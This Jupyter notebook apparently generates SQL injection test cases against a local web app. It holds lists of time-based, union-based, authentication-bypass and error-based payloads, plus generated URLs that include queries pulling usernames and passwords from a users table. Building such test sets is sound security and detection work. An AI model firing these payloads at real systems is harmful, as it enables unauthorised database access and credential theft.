{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "plain text inject\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Time Based SQL Injection\n",
    "Time_Based =[''' ' ;waitfor delay '0:0:5'-- ''',\n",
    "''' ' );waitfor delay '0:0:5'-- ''',\n",
    "''' ' ;waitfor delay '0:0:5'-- ''',\n",
    "''' ' );waitfor delay '0:0:5'-- ''',\n",
    "''' ' ));waitfor delay '0:0:5'-- ''',\n",
    "''' ' ));waitfor delay '0:0:5'-- ''',\n",
    "''' ' benchmark(10000000,MD5(1))#''',\n",
    "''' ' 1 or benchmark(10000000,MD5(1))#''',\n",
    "''' '(1)r benchmark(10000000,MD5(1))#''',\n",
    "''' ' or benchmark(10000000,MD5(1))#''',\n",
    "''' ' 1) or benchmark(10000000,MD5(1))#''',\n",
    "''' ' ) or benchmark(10000000,MD5(1))#''',\n",
    "''' ' ) or benchmark(10000000,MD5(1))#''',\n",
    "''' ' 1)) or benchmark(10000000,MD5(1))#''',\n",
    "''' ' )) or benchmark(10000000,MD5(1))#''',\n",
    "''' ' 1 or pg_sleep(5)-- ''',\n",
    "''' ' (1)r pg_sleep(5)-- ''',\n",
    "''' ' or pg_sleep(5)-- ''',\n",
    "''' ' 1) or pg_sleep(5)-- ''',\n",
    "''' ' ) or pg_sleep(5)-- ''',\n",
    "''' ' ) or pg_sleep(5)-- ''',\n",
    "''' ' 1)) or pg_sleep(5)-- ''',\n",
    "''' ' )) or pg_sleep(5)-- ''',\n",
    "''' ' )) or pg_sleep(5)-- ''',\n",
    "''' ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe''',\n",
    "''' ' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=' ''',\n",
    "''' ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)''',\n",
    "''' ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- ''',\n",
    "''' ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#''',\n",
    "''' ' SLEEP(5)#''',\n",
    "''' ' SLEEP(5)-- ''',\n",
    "''' ' SLEEP(5)=\" ''',\n",
    "''' ' (1)r SLEEP(5)''',\n",
    "''' ' (1)r SLEEP(5)#''',\n",
    "''' ' (1)r SLEEP(5)-- ''',\n",
    "''' ' (1)r SLEEP(5)=\"''',\n",
    "''' ' waitfor delay '00:00:05' ''',\n",
    "''' ' waitfor delay '00:00:05'-- ''',\n",
    "''' ' waitfor delay '00:00:05'#''',\n",
    "''' ' benchmark(50000000,MD5(1))''',\n",
    "''' ' benchmark(50000000,MD5(1))-- ''',\n",
    "''' ' benchmark(50000000,MD5(1))#''']\n",
    "\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Union Select\n",
    "union_based = [ \n",
    "     \" ' ORDER BY SLEEP(5)#\",\n",
    "     \" ' ORDER BY 1,SLEEP(5)#\",\n",
    "     \" ' ORDER BY 1,SLEEP(5),3#\",\n",
    "     \" ' ORDER BY 1,SLEEP(5),3,4#\",\n",
    "     ''' ' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),4,5#''',\n",
    "     \" ' ORDER BY SLEEP(5)-- \",\n",
    "     \" ' ORDER BY 1,SLEEP(5)-- \",\n",
    "     \" ' ORDER BY 1,SLEEP(5),3-- \",\n",
    "     \" ' ORDER BY 1,SLEEP(5),3,4-- \",\n",
    "     ''' ' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),4,5-- ''',\n",
    "     \" ' UNION ALL SELECT 1\",\n",
    "     \" ' UNION ALL SELECT 1,2\",\n",
    "     \" ' UNION ALL SELECT 1,2,3\",\n",
    "     \" ' UNION ALL SELECT 1#\",\n",
    "     \" ' UNION ALL SELECT 1,2#\",\n",
    "     \" ' UNION ALL SELECT 1,2,3#\",\n",
    "     \" ' UNION ALL SELECT 1,2,3,4#\",\n",
    "     \" ' UNION ALL SELECT 1-- \",\n",
    "     \" ' UNION ALL SELECT 1,2-- \",\n",
    "     \" ' UNION ALL SELECT 1,2,3-- \",\n",
    "     \" ' UNION ALL SELECT 1,2,3,4-- \",\n",
    "     \" ' UNION SELECT @@VERSION,SLEEP(5),3\",\n",
    "     \" ' UNION SELECT @@VERSION,SLEEP(5),USER(),4\",\n",
    "     ''' ' UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\"A\")),5''',\n",
    "     ''' ' UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\"A\")),5,6''',\n",
    "     ''' ' UNION SELECT @@VERSION,SLEEP(5),USER(),4#''',\n",
    "     ''' ' UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\"A\")),5#''',\n",
    "     ''' ' UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\"A\")),5,6#''',\n",
    "     ''' ' UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),NULL,NULL -- ''',\n",
    "     ''' ' UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),NULL,NULL,NULL -- '''\n",
    "     ]\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [],
   "source": [
    "Bypass = [\n",
    "    ''' ' or true -- ''\",\n",
    "    \" ' or true -- \",\n",
    "    \" ' or true -- \",\n",
    "    \" ) or true -- \",\n",
    "    \" ') or true -- \",\n",
    "    \" ' or 'x'='x\",\n",
    "    \" ') or ('x')=('x\",\n",
    "    \" ') or (('x'))=(('x\",\n",
    "    ''' ' or \"x\"=\"x ''',\n",
    "    ''' ') or (\"x\")=(\"x ''',\n",
    "    ''' ')) or ((\"x\"))=((\"x ''',\n",
    "    \" ' or 1=1\",\n",
    "    \" ' or 1=1-- \",\n",
    "    \" ' or 1=1#\",\n",
    "    \" ' or 1=1/*\",\n",
    "    \" ' -- \",\n",
    "    \"' #\",\n",
    "    \"'/*\",\n",
    "    \"' or '1'='1\",\n",
    "    \"' or '1'='1'-- \",\n",
    "    \"' or '1'='1'#\",\n",
    "    \"' or '1'='1'/*\",\n",
    "    \"'or 1=1 or ''='\",\n",
    "    \"' or 1=1\",\n",
    "    \"' or 1=1-- \",\n",
    "    \"' or 1=1#\",\n",
    "    \"' or 1=1/*\",\n",
    "    \"') or ('1'='1\",\n",
    "    \"') or ('1'='1'-- \",\n",
    "    \"') or ('1'='1'#\",\n",
    "    \"') or ('1'='1'/*\",\n",
    "    \"') or '1'='1\",\n",
    "    \"') or '1'='1'-- \",\n",
    "    \"') or '1'='1'#\",\n",
    "    \"') or '1'='1'/*\",\n",
    "    ''' 1234 ' AND 1=0 UNION ALL SELECT 'admin\", '81dc9bdb52d04dc20036dbd8313ed055 ''',\n",
    "    ''' \\\" -- \" ''',\n",
    "    ''' \\\" #''',\n",
    "    ''' \\\"/*''',\n",
    "    ''' \\' Or \\\"1\\\"=\\\"1 ''',\n",
    "    ''' \\' Or \\\"1\\\"=\\\"1\\\"-- ''',\n",
    "    ''' \\' Or \\\"1\\\"=\\\"1\\\"# ''',\n",
    "    ''' \\' Or \\\"1\\\"=\\\"1\\\"/* ''',\n",
    "    ''' \\\"or 1=1 or \\\"\\\"=\\\" ''',\n",
    "    ''' \\' Or 1=1''',\n",
    "    ''' \\' Or 1=1-- ''',\n",
    "    ''' \\' Or 1=1#''',\n",
    "    ''' \\' Or 1=1/*''',\n",
    "    ''' \\\") or (\\\"1\\\"=\\\"1''',\n",
    "    ''' \\\") or (\\\"1\\\"=\\\"1\\\"-- ''',\n",
    "    ''' \\\") or (\\\"1\\\"=\\\"1\\\"#''',\n",
    "    ''' \\\") or (\\\"1\\ '''\n",
    "    ]\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Gen-test-case!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "import random"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [],
   "source": [
    "# errorbase -->\n",
    "# Time_Based[]\n",
    "# Bypass[]\n",
    "table_name = [\"employee\",\"customer\",\"service\",\"users\"]\n",
    "user = ['lnwza007','eiei123']"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In band\n",
    "1.error-based\n",
    "2.union"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [],
   "source": [
    "errorbase=[\n",
    "\"OR 1=1#\",\n",
    "\"OR 1=0#\",\n",
    "\"OR x=x#\",\n",
    "\"OR x=y#\",\n",
    "\"OR 1=1-- \",\n",
    "\"OR 1=0-- \",\n",
    "\"OR x=x-- \",\n",
    "\"OR x=y-- \",\n",
    "\"OR 3409=3409 AND ('pytW' LIKE 'pytW\",\n",
    "\"OR 3409=3409 AND ('pytW' LIKE 'pytY\",\n",
    "\"HAVING 1=1\",\n",
    "\"HAVING 1=0\",\n",
    "\"HAVING 1=1#\",\n",
    "\"HAVING 1=0#\",\n",
    "\"HAVING 1=1-- \",\n",
    "\"HAVING 1=0-- \",\n",
    "\"AND 1=1\",\n",
    "\"AND 1=0\",\n",
    "\"AND 1=1-- \",\n",
    "\"AND 1=0-- \",\n",
    "\"AND 1=1#\",\n",
    "\"AND 1=0#\",\n",
    "\"AND 1=1 AND '%'='\",\n",
    "\"AND 1=0 AND '%'='\",\n",
    "\"AND 1083=1083 AND (1427=1427\",\n",
    "\"AND 7506=9091 AND (5913=5913\",\n",
    "\"AND 1083=1083 AND ('1427=1427\",\n",
    "\"AND 7506=9091 AND ('5913=5913\",\n",
    "\"AND 7300=7300 AND 'pKlZ'='pKlZ\",\n",
    "\"AND 7300=7300 AND 'pKlZ'='pKlY\",\n",
    "\"AND 7300=7300 AND ('pKlZ'='pKlZ\",\n",
    "\"AND 7300=7300 AND ('pKlZ'='pKlY\",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=1\",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=0\",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=1#\",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=0#\",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=1-- \",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=0-- \",\n",
    "\"WHERE 1=1 AND 1=1\",\n",
    "\"WHERE 1=1 AND 1=0\",\n",
    "\"WHERE 1=1 AND 1=1#\",\n",
    "\"WHERE 1=1 AND 1=0#\",\n",
    "\"WHERE 1=1 AND 1=1-- \",\n",
    "\"WHERE 1=1 AND 1=0-- \",\n",
    "\"ORDER BY 1-- \",\n",
    "\"ORDER BY 2-- \",\n",
    "\"ORDER BY 3-- \",\n",
    "\"ORDER BY 4-- \",\n",
    "\"ORDER BY 5-- \",\n",
    "\"ORDER BY 6-- \",\n",
    "\"ORDER BY 7-- \",\n",
    "\"ORDER BY 8-- \",\n",
    "\"ORDER BY 9-- \",\n",
    "\"ORDER BY 10-- \",\n",
    "\"ORDER BY 11-- \",\n",
    "\"ORDER BY 12-- \",\n",
    "\"ORDER BY 13-- \",\n",
    "\"ORDER BY 14-- \",\n",
    "\"ORDER BY 15-- \",\n",
    "\"ORDER BY 16-- \",\n",
    "\"ORDER BY 17-- \",\n",
    "\"ORDER BY 18-- \",\n",
    "\"ORDER BY 19-- \",\n",
    "\"ORDER BY 20-- \",\n",
    "\"ORDER BY 21-- \",\n",
    "\"ORDER BY 22-- \",\n",
    "\"ORDER BY 23-- \",\n",
    "\"ORDER BY 24\",\n",
    "\"ORDER BY 25\",\n",
    "\"ORDER BY 26\",\n",
    "\"ORDER BY 27\",\n",
    "\"ORDER BY 28\",\n",
    "\"ORDER BY 29\",\n",
    "\"ORDER BY 30\",\n",
    "\"ORDER BY 31337\",\n",
    "\"RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\",\n",
    "\"RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\",\n",
    "\"IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- \",\n",
    "\"IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- \",\n",
    "\"%' AND 8310=8310 AND '%'='\",\n",
    "\"%' AND 8310=8311 AND '%'='\",\n",
    "\"and (select substring(@@version,1,1))='X'\",\n",
    "\"and (select substring(@@version,1,1))='M'\",\n",
    "\"and (select substring(@@version,2,1))='i'\",\n",
    "\"and (select substring(@@version,2,1))='y'\",\n",
    "\"and (select substring(@@version,3,1))='c'\",\n",
    "\"and (select substring(@@version,3,1))='S'\",\n",
    "\"and (select substring(@@version,3,1))='X'\"]\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [],
   "source": [
    "def random_data(list_data):\n",
    "    BP_gen=[]\n",
    "    for i in range(30) :\n",
    "        BP_gen.append(user[random.randint(0, len(user)-1)]+\" ' \"  +\n",
    "        list_data[random.randint(0, len(list_data)-1)] )\n",
    "    return BP_gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"eiei123 ' %' AND 8310=8310 AND '%'='\",\n",
       " \"lnwza007 ' AND 1=1#\",\n",
       " \"eiei123 ' ORDER BY 4-- \",\n",
       " \"eiei123 ' AND 7300=7300 AND 'pKlZ'='pKlZ\",\n",
       " \"eiei123 ' HAVING 1=0#\",\n",
       " \"lnwza007 ' ORDER BY 19-- \",\n",
       " \"lnwza007 ' ORDER BY 10-- \",\n",
       " \"eiei123 ' ORDER BY 5-- \",\n",
       " \"eiei123 ' HAVING 1=1\",\n",
       " \"lnwza007 ' and (select substring(@@version,1,1))='M'\"]"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "random_data(errorbase)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "URL\n",
    "(finished)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "import random\n",
    "url= \"http://localhost:3000/employee?id=\"\n",
    "see_able_col=[\"employee_id\" ,\n",
    "    \"prefixname\" ,\n",
    "    \"fname\",\n",
    "    \"lname\" ,\n",
    "    \"nickname\" ,\n",
    "    \"email\",\n",
    "    \"tel\" ,\n",
    "    \"work_background\" ,\n",
    "    \"graduation_certificate\" ,\n",
    "    \"address\" ,\n",
    "    \"id_card\" ,\n",
    "    \"house_registration\" ]\n",
    "unsee_col=[\"price\",\n",
    "            \"name\",\n",
    "            \"tel\",\n",
    "            \"email\",\n",
    "            \"lname\",\n",
    "            \"fname\",\n",
    "            \"customer_id\",\n",
    "            \"username\",\n",
    "            \"password\"\n",
    "            ]\n",
    "see_able_value= [(\"E001\", \"Mr.\", \"bobo1\", \"two1\", \"baba1\", \"E001@gmail.com\", '0123456781' , \"companyA, companyB\", \"XAU\", \"123 r.xxxxx 50200\", \"1530302340921\", \"123 r.xxxxx 54000\"), \n",
    "       (\"E002\", \"Mr.\", \"bobo2\", \"two2\", \"baba2\", \"E002@gmail.com\", '0123456782' , \"companyA, companyB\", \"XAU\", \"123 r.xxxxx 50200\", \"1530302340922\", '123 r.xxxxx 54000'), \n",
    "       (\"E003\", \"Mr.\", \"bobo3\", \"two3\", \"baba3\", \"E003@gmail.com\", '0123456783' , \"companyA, companyB\", \"XAU\", \"123 r.xxxxx 50200\", \"1530302340923\", '123 r.xxxxx 54000'), \n",
    "       (\"E004\", \"Mr.\", \"bobo4\", \"two4\", \"baba4\", \"E004@gmail.com\", '0123456784' , \"companyA, companyB\", \"XAU\", \"123 r.xxxxx 50200\", \"1530302340924\", '123 r.xxxxx 54000'), \n",
    "       (\"E005\", \"Mr.\", \"bobo5\", \"two5\", \"baba5\", \"E005@gmail.com\", '0123456785' , \"companyA, companyB\", \"XAU\", \"123 r.xxxxx 50200\", \"1530302340925\", '123 r.xxxxx 54000')]\n",
    "unsee_value={\"price\":[\"100\",\"200\",\"300\",\"400\"],\n",
    "            \"name\":[\"A\",\"B\",\"C\",\"D\"],\n",
    "            \"tel\":[\"0123456781\", \"0123456782\"],\n",
    "            \"email\":[\"E001@gmail.com\", \"E002@gmail.com\"],\n",
    "            \"lname\":[\"memo1\", \"memo2\"],\n",
    "            \"fname\":[\"one1\", \"one2\"],\n",
    "            \"customer_id\":[\"C001\",\"C002\"],\n",
    "            \"username\":[\"lnwza007\",\"eiei123\"],\n",
    "            \"password\":[\"123\",\"123\"]}\n",
    "\n",
    "unsee_table =[\"users\",\"service\",\"customer\"]\n",
    "\n",
    "table_value ={\"users\":[\"username\",\"password\"],\n",
    "              \"service\":[\"name\",\"price\"],\n",
    "              \"customer\":[\"fname\",\"customer_id\",\"lname\",\"email\",\"tel\"]\n",
    "            }\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "customer\n",
      "email\n",
      "E002@gmail.com\n"
     ]
    }
   ],
   "source": [
    "unsee_t=unsee_table[random.randint(0, len(unsee_table)-1)]\n",
    "print(unsee_t)\n",
    "table_V=table_value[unsee_t][random.randint(0, len(table_value[unsee_t])-1)]\n",
    "print(table_V)\n",
    "unsee_v=unsee_value[table_V][random.randint(0, len(unsee_value[table_V])-1)]\n",
    "\n",
    "print(unsee_v)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [],
   "source": [
    "def random_urldata(url,list_data,value):\n",
    "    gen=[]\n",
    "    for i in range(30) :\n",
    "        random_table_value=random.randint(0, len(value)-1)\n",
    "        gen.append(url+(value[random_table_value][0])\n",
    "        +list_data[random.randint(0, len(list_data)-1)])\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"http://localhost:3000/employee?id=E002AND 1083=1083 AND ('1427=1427\",\n",
       " 'http://localhost:3000/employee?id=E004ORDER BY 14-- ',\n",
       " 'http://localhost:3000/employee?id=E001AND 1=1',\n",
       " 'http://localhost:3000/employee?id=E002AND 1=0-- ',\n",
       " 'http://localhost:3000/employee?id=E004HAVING 1=0-- ',\n",
       " 'http://localhost:3000/employee?id=E005OR x=x#',\n",
       " 'http://localhost:3000/employee?id=E002HAVING 1=0#',\n",
       " 'http://localhost:3000/employee?id=E004ORDER BY 24',\n",
       " 'http://localhost:3000/employee?id=E004ORDER BY 8-- ',\n",
       " 'http://localhost:3000/employee?id=E001ORDER BY 27',\n",
       " 'http://localhost:3000/employee?id=E003HAVING 1=0#',\n",
       " 'http://localhost:3000/employee?id=E003AS INJECTX WHERE 1=1 AND 1=1',\n",
       " 'http://localhost:3000/employee?id=E005OR 1=0-- ',\n",
       " \"http://localhost:3000/employee?id=E003AND 7300=7300 AND ('pKlZ'='pKlY\",\n",
       " 'http://localhost:3000/employee?id=E001ORDER BY 6-- ',\n",
       " 'http://localhost:3000/employee?id=E005ORDER BY 21-- ',\n",
       " 'http://localhost:3000/employee?id=E002AS INJECTX WHERE 1=1 AND 1=1#',\n",
       " 'http://localhost:3000/employee?id=E004HAVING 1=1#',\n",
       " \"http://localhost:3000/employee?id=E001OR 3409=3409 AND ('pytW' LIKE 'pytW\",\n",
       " 'http://localhost:3000/employee?id=E005ORDER BY 7-- ',\n",
       " 'http://localhost:3000/employee?id=E003ORDER BY 6-- ',\n",
       " 'http://localhost:3000/employee?id=E002ORDER BY 25',\n",
       " 'http://localhost:3000/employee?id=E002ORDER BY 19-- ',\n",
       " 'http://localhost:3000/employee?id=E002ORDER BY 18-- ',\n",
       " 'http://localhost:3000/employee?id=E005OR 1=0-- ',\n",
       " 'http://localhost:3000/employee?id=E002ORDER BY 27',\n",
       " 'http://localhost:3000/employee?id=E002HAVING 1=1',\n",
       " 'http://localhost:3000/employee?id=E003AND 1=0',\n",
       " \"http://localhost:3000/employee?id=E001AND 1=0 AND '%'='\",\n",
       " 'http://localhost:3000/employee?id=E001IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- ']"
      ]
     },
     "execution_count": 69,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "random_urldata(url,errorbase,see_able_value)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomunion_urldata(url,list_data,value):\n",
    "    gen=[]\n",
    "    for i in range(30) :\n",
    "        random_table_value=random.randint(0, len(value)-1)\n",
    "        gen.append(url+(value[random_table_value][0])\n",
    "        +list_data[random.randint(0, len(list_data )-1)])\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['http://localhost:3000/employee?id=E005 \\' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),4,5#',\n",
       " \"http://localhost:3000/employee?id=E002 ' UNION SELECT @@VERSION,SLEEP(5),USER(),4#\",\n",
       " \"http://localhost:3000/employee?id=E002 ' UNION ALL SELECT 1-- \",\n",
       " 'http://localhost:3000/employee?id=E001 \\' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),4,5#',\n",
       " \"http://localhost:3000/employee?id=E001 ' ORDER BY SLEEP(5)-- \",\n",
       " \"http://localhost:3000/employee?id=E004 ' UNION ALL SELECT 1-- \",\n",
       " 'http://localhost:3000/employee?id=E002 \\' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),4,5-- ',\n",
       " \"http://localhost:3000/employee?id=E002 ' UNION ALL SELECT 1#\",\n",
       " \"http://localhost:3000/employee?id=E004 ' UNION ALL SELECT 1,2\",\n",
       " \"http://localhost:3000/employee?id=E004 ' UNION ALL SELECT 1,2,3,4-- \",\n",
       " 'http://localhost:3000/employee?id=E002 \\' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),4,5#',\n",
       " 'http://localhost:3000/employee?id=E002 \\' UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),NULL,NULL,NULL -- ',\n",
       " \"http://localhost:3000/employee?id=E004 ' UNION ALL SELECT 1,2-- \",\n",
       " \"http://localhost:3000/employee?id=E001 ' UNION ALL SELECT 1,2,3,4-- \",\n",
       " \"http://localhost:3000/employee?id=E004 ' UNION SELECT @@VERSION,SLEEP(5),3\",\n",
       " \"http://localhost:3000/employee?id=E002 ' UNION ALL SELECT 1,2#\",\n",
       " \"http://localhost:3000/employee?id=E003 ' UNION ALL SELECT 1,2,3,4#\",\n",
       " \"http://localhost:3000/employee?id=E001 ' UNION ALL SELECT 1,2,3,4#\",\n",
       " \"http://localhost:3000/employee?id=E001 ' UNION ALL SELECT 1,2#\",\n",
       " \"http://localhost:3000/employee?id=E002 ' ORDER BY 1,SLEEP(5)-- \",\n",
       " \"http://localhost:3000/employee?id=E003 ' UNION ALL SELECT 1#\",\n",
       " \"http://localhost:3000/employee?id=E004 ' UNION ALL SELECT 1,2#\",\n",
       " \"http://localhost:3000/employee?id=E001 ' ORDER BY 1,SLEEP(5),3#\",\n",
       " \"http://localhost:3000/employee?id=E003 ' UNION ALL SELECT 1#\",\n",
       " \"http://localhost:3000/employee?id=E003 ' ORDER BY 1,SLEEP(5)-- \",\n",
       " 'http://localhost:3000/employee?id=E002 \\' UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\"A\")),5',\n",
       " \"http://localhost:3000/employee?id=E002 ' UNION ALL SELECT 1,2,3,4#\",\n",
       " 'http://localhost:3000/employee?id=E003 \\' UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),NULL,NULL,NULL -- ',\n",
       " 'http://localhost:3000/employee?id=E003 \\' UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\"A\")),5,6',\n",
       " \"http://localhost:3000/employee?id=E003 ' UNION ALL SELECT 1,2#\"]"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "randomunion_urldata(url,union_based ,see_able_value)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomunionWrealdata_urldata(url,value,table_value,unsee_table,unsee_value):\n",
    "    gen=[]\n",
    "    for i in range(10) :\n",
    "        unsee_t=unsee_table[random.randint(0, len(unsee_table)-1)] #select table\n",
    "        table_V=table_value[unsee_t][random.randint(0, len(table_value[unsee_t])-1)] # colum\n",
    "        unsee_v=unsee_value[table_V][random.randint(0, len(unsee_value[table_V])-1)] # value in that column\n",
    "        random_table_value=random.randint(0, len(value)-1)\n",
    "        gen.append(url+(value[random_table_value][0])+\" ' \"\n",
    "        +\"UNION SELECT \"+ table_V + \" \" + \"FROM \" +unsee_t+ \"-- \")\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"http://localhost:3000/employee?id=E003 ' UNION SELECT name FROM service-- \",\n",
       " \"http://localhost:3000/employee?id=E002 ' UNION SELECT password FROM users-- \",\n",
       " \"http://localhost:3000/employee?id=E005 ' UNION SELECT name FROM service-- \",\n",
       " \"http://localhost:3000/employee?id=E003 ' UNION SELECT username FROM users-- \",\n",
       " \"http://localhost:3000/employee?id=E003 ' UNION SELECT username FROM users-- \",\n",
       " \"http://localhost:3000/employee?id=E004 ' UNION SELECT password FROM users-- \",\n",
       " \"http://localhost:3000/employee?id=E003 ' UNION SELECT username FROM users-- \",\n",
       " \"http://localhost:3000/employee?id=E001 ' UNION SELECT customer_id FROM customer-- \",\n",
       " \"http://localhost:3000/employee?id=E001 ' UNION SELECT name FROM service-- \",\n",
       " \"http://localhost:3000/employee?id=E004 ' UNION SELECT username FROM users-- \"]"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "randomunionWrealdata_urldata(url,see_able_value,table_value,unsee_table,unsee_value)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"http://localhost:3000/employee?id=E002 ' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=' \",\n",
       " \"http://localhost:3000/employee?id=E002 ' 1)) or pg_sleep(5)-- \",\n",
       " \"http://localhost:3000/employee?id=E005 ' )) or benchmark(10000000,MD5(1))#\",\n",
       " \"http://localhost:3000/employee?id=E003 ' ));waitfor delay '0:0:5'-- \",\n",
       " \"http://localhost:3000/employee?id=E003 ' 1)) or benchmark(10000000,MD5(1))#\",\n",
       " \"http://localhost:3000/employee?id=E003 ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- \",\n",
       " \"http://localhost:3000/employee?id=E005 ' (1)r SLEEP(5)-- \",\n",
       " \"http://localhost:3000/employee?id=E005 ' ) or pg_sleep(5)-- \",\n",
       " \"http://localhost:3000/employee?id=E003 ' ;waitfor delay '0:0:5'-- \",\n",
       " \"http://localhost:3000/employee?id=E002 ' 1)) or pg_sleep(5)-- \"]"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "random_urldata(url,Time_Based,see_able_value)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import string\n",
    "import random\n",
    "\n",
    "showList = [\"DATABASES\", \"TABLES\", \"COLUME\"]\n",
    "\n",
    "last = [\"#\", \"# \", \"-- \"]\n",
    "table =[\"users\",\"service\",\"customer\", \"employee\"]\n",
    "\n",
    "table_value ={\"users\":[\"username\",\"password\"],\n",
    "              \"service\":[\"name\",\"price\"],\n",
    "              \"customer\":[\"fname\",\"customer_id\",\"lname\",\"email\",\"tel\"],\n",
    "              \"employee\":[\"employee_id\", \"prefixname\", \"fname\", \"lname\", \"nickname\", \"email\", \"tel\", \"work_background\", \"graduation_certificate\", \"address\", \"id_card\", \"house_registration\"]\n",
    "            }\n",
    "\n",
    "type_of_value = {\"username\":\"str\",\n",
    "\"fname\":\"str\",\n",
    "\"lname\":\"str\",\n",
    "\"name\":\"str\",\n",
    "\"prefixname\":\"str\",\n",
    "\"nickname\":\"str\",\n",
    "\"password\":\"both\",\n",
    "\"customer_id\":\"both\",\n",
    "\"email\":\"both\",\n",
    "\"employee_id\":\"both\",\n",
    "\"work_background\":\"both\",\n",
    "\"graduation_certificate\":\"both\",\n",
    "\"address\":\"both\",\n",
    "\"house_registration\":\"both\",\n",
    "\"tel\":\"tel\",\n",
    "\"price\":\"price\",\n",
    "\"id_card\":\"id_card\"}\n",
    "\n",
    "customer_value = [{\"username\":\"Emma\",\"password\":\"u8N6tK9g\"},{\"username1\":\"Noah\",\"password1\":\"p7H5jM6z\"},\n",
    "{\"username\":\"Olivia\",\"password\":\"h9L8kQ2t\"},{\"username1\":\"Liam\",\"password1\":\"z5T8gP9u\"},\n",
